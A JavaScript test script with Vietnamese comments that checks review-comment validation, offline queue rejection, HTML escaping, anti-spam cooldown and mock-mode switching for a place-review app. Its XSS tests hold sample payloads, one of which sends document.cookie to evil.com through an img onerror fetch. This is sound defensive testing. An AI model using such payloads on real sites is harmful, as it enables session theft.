// Automated verification script for G3: Review & Data Safety
import assert from 'assert';
import {
    validateCommentInput,
    CommentValidationError,
    CommentCooldownError,
    assertCooldown,
    markCooldown,
    summarizeComments,
    isMockMode
} from '../js/comments.js';
import { escapeHtml } from '../js/ui.js';
import { saveOfflineReview, isSyncing } from '../js/offline-sync.js';

if (typeof globalThis.localStorage === 'undefined') {
    const storage = new Map();
    globalThis.localStorage = {
        getItem: (k) => storage.get(k) || null,
        setItem: (k, v) => storage.set(k, String(v)),
        removeItem: (k) => storage.delete(k),
        clear: () => storage.clear()
    };
}

console.log('=== BẮT ĐẦU KIỂM THỬ TỰ ĐỘNG G3: REVIEW & AN TOÀN DỮ LIỆU ===\n');

// -------------------------------------------------------------
// 1. KIỂM THỬ VALIDATION DÙNG CHUNG (validateCommentInput)
// -------------------------------------------------------------
console.log('1. Kiểm thử validateCommentInput:');

// Ca 1.1: Payload hợp lệ
const validPayload = {
    place_id: 'ao-ba-om',
    place_name: 'Ao Bà Om',
    author_name: 'Nguyễn Văn A',
    rating: 5,
    comment_text: 'Cảnh đẹp thanh bình, nhiều cây dầu cổ thụ rất mát mẻ!'
};
const res1 = validateCommentInput(validPayload);
assert.strictEqual(res1.place_id, 'ao-ba-om');
assert.strictEqual(res1.author_name, 'Nguyễn Văn A');
assert.strictEqual(res1.rating, 5);
assert.strictEqual(res1.comment_text, 'Cảnh đẹp thanh bình, nhiều cây dầu cổ thụ rất mát mẻ!');
assert.ok(res1.client_review_id.startsWith('clrev_') || res1.client_review_id.startsWith('rev_'), 'Phải tự sinh client_review_id');
console.log('  ✓ Chấp nhận payload hợp lệ và sinh client_review_id chuẩn');

// Ca 1.2: Giữ nguyên client_review_id nếu đã có (Idempotency)
const res1b = validateCommentInput({ ...validPayload, client_review_id: 'custom-uuid-12345' });
assert.strictEqual(res1b.client_review_id, 'custom-uuid-12345');
console.log('  ✓ Giữ nguyên client_review_id để đảm bảo idempotency');

// Ca 1.3: Kiểm thử Tên người đánh giá (2 - 80 ký tự sau khi trim)
console.log('  - Kiểm thử tác giả (author_name):');
// Tên 1 ký tự: "A" -> Phải bị từ chối
assert.throws(() => {
    validateCommentInput({ ...validPayload, author_name: 'A' });
}, (err) => {
    assert.strictEqual(err instanceof CommentValidationError, true);
    assert.strictEqual(err.field, 'author_name');
    return true;
}, 'Tên "A" phải bị từ chối');

// Tên chỉ có khoảng trắng: "   " -> Phải bị từ chối
assert.throws(() => {
    validateCommentInput({ ...validPayload, author_name: '    ' });
}, (err) => {
    assert.strictEqual(err.field, 'author_name');
    return true;
}, 'Tên chỉ có khoảng trắng phải bị từ chối');

// Tên rỗng -> Phải bị từ chối
assert.throws(() => {
    validateCommentInput({ ...validPayload, author_name: '' });
}, (err) => err.field === 'author_name');

// Tên 2 ký tự: "An" -> Hợp lệ
const resAn = validateCommentInput({ ...validPayload, author_name: '  An  ' });
assert.strictEqual(resAn.author_name, 'An');

// Tên quá 80 ký tự -> Phải bị từ chối
assert.throws(() => {
    validateCommentInput({ ...validPayload, author_name: 'A'.repeat(81) });
}, (err) => err.field === 'author_name');
console.log('  ✓ Kiểm tra giới hạn tên tác giả (2-80 ký tự, chặn "A", tự trim)');

// Ca 1.4: Kiểm thử Số sao (rating: 1-5 integer, bắt buộc)
console.log('  - Kiểm thử số sao (rating):');
// Rating thiếu hoặc rỗng
assert.throws(() => {
    validateCommentInput({ ...validPayload, rating: null });
}, (err) => err.field === 'rating');

assert.throws(() => {
    validateCommentInput({ ...validPayload, rating: '' });
}, (err) => err.field === 'rating');

assert.throws(() => {
    validateCommentInput({ ...validPayload, rating: undefined });
}, (err) => err.field === 'rating');

// Rating ngoài khoảng [1, 5]
assert.throws(() => {
    validateCommentInput({ ...validPayload, rating: 0 });
}, (err) => err.field === 'rating');

assert.throws(() => {
    validateCommentInput({ ...validPayload, rating: 6 });
}, (err) => err.field === 'rating');

// Rating không phải số nguyên
assert.throws(() => {
    validateCommentInput({ ...validPayload, rating: 4.5 });
}, (err) => err.field === 'rating');

// Rating dạng chuỗi số nguyên hợp lệ ('4')
const resStrRating = validateCommentInput({ ...validPayload, rating: '4' });
assert.strictEqual(resStrRating.rating, 4);
console.log('  ✓ Kiểm tra bắt buộc chọn số sao (1-5 nguyên, từ chối null/0/6/số lẻ)');

// Ca 1.5: Kiểm thử Nội dung đánh giá (comment_text: 3-1000 ký tự)
console.log('  - Kiểm thử nội dung đánh giá (comment_text):');
// Nội dung < 3 ký tự: "ok", "a", ""
assert.throws(() => {
    validateCommentInput({ ...validPayload, comment_text: 'ok' });
}, (err) => err.field === 'comment_text');

assert.throws(() => {
    validateCommentInput({ ...validPayload, comment_text: '   ' });
}, (err) => err.field === 'comment_text');

// Nội dung đúng 3 ký tự: "Tốt"
const resTot = validateCommentInput({ ...validPayload, comment_text: ' Tốt ' });
assert.strictEqual(resTot.comment_text, 'Tốt');

// Nội dung > 1000 ký tự
assert.throws(() => {
    validateCommentInput({ ...validPayload, comment_text: 'B'.repeat(1001) });
}, (err) => err.field === 'comment_text');
console.log('  ✓ Kiểm tra nội dung bình luận (3-1000 ký tự, chặn "ok", tự trim)');

// Ca 1.6: Kiểm thử URL ảnh / Data URI độc hại
console.log('  - Kiểm thử an toàn định dạng ảnh (photo_data):');
// Độc hại: javascript:
assert.throws(() => {
    validateCommentInput({ ...validPayload, photo_data: 'javascript:alert(document.cookie)' });
}, (err) => err.field === 'photo_data');

// Độc hại: data:text/html
assert.throws(() => {
    validateCommentInput({ ...validPayload, photo_data: 'data:text/html;base64,PHNjcmlwdD4=' });
}, (err) => err.field === 'photo_data');

// Hợp lệ: data:image/jpeg
const validDataUri = 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/';
const resImg = validateCommentInput({ ...validPayload, photo_data: validDataUri });
assert.strictEqual(resImg.photo_data, validDataUri);

// Hợp lệ: https://
const validHttps = 'https://images.unsplash.com/photo-12345';
const resHttps = validateCommentInput({ ...validPayload, photo_data: validHttps });
assert.strictEqual(resHttps.photo_data, validHttps);
console.log('  ✓ Chặn toàn bộ link ảnh độc hại (javascript:, data:text/html), chỉ cho phép image MIME/HTTPS');

// -------------------------------------------------------------
// 2. CHẶN DỮ LIỆU SAI TRƯỚC KHI VÀO QUEUE (saveOfflineReview)
// -------------------------------------------------------------
console.log('\n2. Kiểm thử chặn dữ liệu sai vào Offline Queue:');

let offlineRejectedCount = 0;
// Thử lưu tên "A" vào offline
try {
    await saveOfflineReview({
        place_id: 'ao-ba-om',
        author_name: 'A',
        rating: 5,
        comment_text: 'Nội dung hợp lệ'
    });
} catch (err) {
    if (err instanceof CommentValidationError && err.field === 'author_name') {
        offlineRejectedCount++;
    }
}

// Thử lưu rating rỗng vào offline (trước đây bị gán mặc định 5 sao)
try {
    await saveOfflineReview({
        place_id: 'ao-ba-om',
        author_name: 'Hữu Tiến',
        rating: null,
        comment_text: 'Nội dung hợp lệ'
    });
} catch (err) {
    if (err instanceof CommentValidationError && err.field === 'rating') {
        offlineRejectedCount++;
    }
}

// Thử lưu comment ngắn < 3 ký tự vào offline
try {
    await saveOfflineReview({
        place_id: 'ao-ba-om',
        author_name: 'Hữu Tiến',
        rating: 5,
        comment_text: 'ok'
    });
} catch (err) {
    if (err instanceof CommentValidationError && err.field === 'comment_text') {
        offlineRejectedCount++;
    }
}

assert.strictEqual(offlineRejectedCount, 3, 'Tất cả 3 input sai đều phải bị từ chối ngay lập tức trước khi vào IndexedDB');
console.log('  ✓ saveOfflineReview từ chối ngay lập tức toàn bộ input sai, KHÔNG ghi vào queue!');

// -------------------------------------------------------------
// 3. KIỂM THỬ XSS & ESCAPE HTML (escapeHtml)
// -------------------------------------------------------------
console.log('\n3. Kiểm thử an toàn hiển thị HTML (escapeHtml):');

const xss1 = '<script>alert("XSS Attack")</script>';
const escaped1 = escapeHtml(xss1);
assert.strictEqual(escaped1, '&lt;script&gt;alert(&quot;XSS Attack&quot;)&lt;/script&gt;');
assert.ok(!escaped1.includes('<script>'), 'Không được chứa thẻ script chưa escape');

const xss2 = '"><img src=x onerror="fetch(\'http://evil.com?c=\'+document.cookie)">';
const escaped2 = escapeHtml(xss2);
assert.strictEqual(escaped2, '&quot;&gt;&lt;img src=x onerror=&quot;fetch(&#039;http://evil.com?c=&#039;+document.cookie)&quot;&gt;');
assert.ok(!escaped2.includes('<img'), 'Không được chứa thẻ img chưa escape');

// Xử lý an toàn null/undefined
assert.strictEqual(escapeHtml(null), '');
assert.strictEqual(escapeHtml(undefined), '');
assert.strictEqual(escapeHtml(12345), '12345');
console.log('  ✓ Toàn bộ ký tự nguy hiểm (&, <, >, ", \') đều được mã hóa HTML entity an toàn');

// -------------------------------------------------------------
// 4. KIỂM THỬ COOLDOWN & CHỐNG SPAM
// -------------------------------------------------------------
console.log('\n4. Kiểm thử Cooldown chống gửi liên tục:');
const testPlace = 'test-cooldown-place';
// Ban đầu chưa có cooldown
assert.strictEqual(assertCooldown(testPlace), true);

// Đánh dấu cooldown
markCooldown(testPlace);

// Ngay sau đó phải ném lỗi Cooldown
assert.throws(() => {
    assertCooldown(testPlace);
}, (err) => {
    assert.strictEqual(err instanceof CommentCooldownError, true);
    assert.strictEqual(err.code, 'COOLDOWN_ERROR');
    return true;
});
console.log('  ✓ Chặn gửi spam cùng địa điểm trong thời gian cooldown');

// -------------------------------------------------------------
// 5. KIỂM THỬ TỔNG HỢP ĐÁNH GIÁ (summarizeComments)
// -------------------------------------------------------------
console.log('\n5. Kiểm thử summarizeComments & tính trung thực số lượng:');
const mockComments = [
    { rating: 5, comment_text: 'Rất tuyệt' },
    { rating: 4, comment_text: 'Tốt' },
    { rating: 3, comment_text: 'Bình thường' }
];

// Ca đủ: đã tải 3, tổng 3
const sum1 = summarizeComments(mockComments, 3);
assert.strictEqual(sum1.count, 3);
assert.strictEqual(sum1.loadedCount, 3);
assert.strictEqual(sum1.isPartial, false);
assert.strictEqual(sum1.average, 4.0);

// Ca tải một phần: tải 3 nhưng tổng trong DB là 50
const sum2 = summarizeComments(mockComments, 50);
assert.strictEqual(sum2.count, 50);
assert.strictEqual(sum2.loadedCount, 3);
assert.strictEqual(sum2.isPartial, true);
assert.strictEqual(sum2.average, 4.0);
console.log('  ✓ summarizeComments phân biệt rõ ràng loadedCount vs totalCount (không ngộ nhận 20 review gần nhất là tất cả)');

// -------------------------------------------------------------
// 6. KIỂM THỬ KHÓA ĐỒNG BỘ CONCURRENCY (isSyncing)
// -------------------------------------------------------------
console.log('\n6. Kiểm thử Cờ khóa Mutex isSyncing():');
assert.strictEqual(typeof isSyncing, 'function');
assert.strictEqual(isSyncing(), false, 'isSyncing ban đầu phải là false');
console.log('  ✓ Khóa đồng bộ Mutex sẵn sàng');

// -------------------------------------------------------------
// 7. KIỂM THỬ isMockMode (MOCK, FALLBACK, SUPABASE)
// -------------------------------------------------------------
console.log('\n7. Kiểm thử ViVuComments.isMockMode():');
// Ca 7.1: Khi dataSource = 'mock' -> phải trả về true
assert.strictEqual(isMockMode({ dataSource: 'mock' }), true, 'Mock dataSource phải trả về true');
console.log('  ✓ dataSource=mock trả về true');

// Ca 7.2: Khi dataSource = 'fallback' -> phải trả về false
assert.strictEqual(isMockMode({ dataSource: 'fallback' }), false, 'Fallback dataSource phải trả về false');
console.log('  ✓ dataSource=fallback trả về false');

// Ca 7.3: Khi dataSource = 'supabase' -> phải trả về false
assert.strictEqual(isMockMode({ dataSource: 'supabase' }), false, 'Supabase dataSource phải trả về false');
console.log('  ✓ dataSource=supabase trả về false');

// Ca 7.4: Khi URL có ?source=mock ghi đè backend
const originalWindow = globalThis.window;
try {
    globalThis.window = { location: { search: '?source=mock' } };
    assert.strictEqual(isMockMode({ dataSource: 'supabase' }), true, 'URL source=mock phải ghi đè supabase');
    assert.strictEqual(isMockMode({ dataSource: 'fallback' }), true, 'URL source=mock phải ghi đè fallback');
    console.log('  ✓ URL ?source=mock ghi đè chính xác thành true');

    // Ca 7.5: Khi URL có ?source=supabase ghi đè mock
    globalThis.window = { location: { search: '?source=supabase' } };
    assert.strictEqual(isMockMode({ dataSource: 'mock' }), false, 'URL source=supabase phải ghi đè mock thành false');
    console.log('  ✓ URL ?source=supabase ghi đè chính xác thành false');

    // Ca 7.6: Khi URL có ?source=fallback ghi đè mock
    globalThis.window = { location: { search: '?source=fallback' } };
    assert.strictEqual(isMockMode({ dataSource: 'mock' }), false, 'URL source=fallback phải ghi đè mock thành false');
    console.log('  ✓ URL ?source=fallback ghi đè chính xác thành false');
} finally {
    globalThis.window = originalWindow;
}

console.log('\n=== TẤT CẢ CÁC BÀI TEST G3 ĐÃ HOÀN TẤT THÀNH CÔNG! ===');
